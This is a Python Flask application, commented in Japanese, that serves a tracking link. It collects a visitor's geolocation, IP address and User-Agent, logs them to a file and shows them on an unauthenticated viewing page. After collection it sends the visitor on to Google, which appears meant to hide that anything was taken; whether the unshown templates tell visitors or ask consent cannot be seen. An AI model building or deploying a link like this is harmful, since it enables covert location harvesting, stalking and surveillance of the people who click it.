from flask import Flask, request, render_template, jsonify, redirect
from datetime import datetime
import logging

# ロギングの設定
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("app.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# グローバル変数としてデータをメモリ上に保持
location_data = []

@app.route('/')
def index():
    """メインページを表示"""
    return render_template('index.html')

@app.route('/tracking-link')
def tracking_link():
    """トラッキング用のページを表示"""
    return render_template('tracking.html')

@app.route('/submit-location', methods=['POST'])
def submit_location():
    """位置情報を受け取るエンドポイント"""
    try:
        data = request.json
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        timestamp = data.get('timestamp', datetime.now().isoformat())
        user_agent = request.headers.get('User-Agent')
        ip_address = request.remote_addr

        location_entry = {
            'latitude': latitude,
            'longitude': longitude,
            'timestamp': timestamp,
            'user_agent': user_agent,
            'ip_address': ip_address
        }

        location_data.append(location_entry)  # メモリ上のリストに追加

        logger.info(f"位置情報を受信: {location_entry}")

        # Googleのリダイレクト先を返す
        return jsonify({'status': 'success', 'redirect': 'https://www.google.co.jp/'})
    except Exception as e:
        logger.error(f"エラーが発生しました: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/collect', methods=['GET'])
def collect_and_redirect():
    """GETリクエストで位置情報収集ページにリダイレクト"""
    return redirect('/tracking-link')

@app.route('/view-data')
def view_data():
    """収集した位置情報を表示するページ（管理者用）"""
    return render_template('data.html', location_data=location_data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)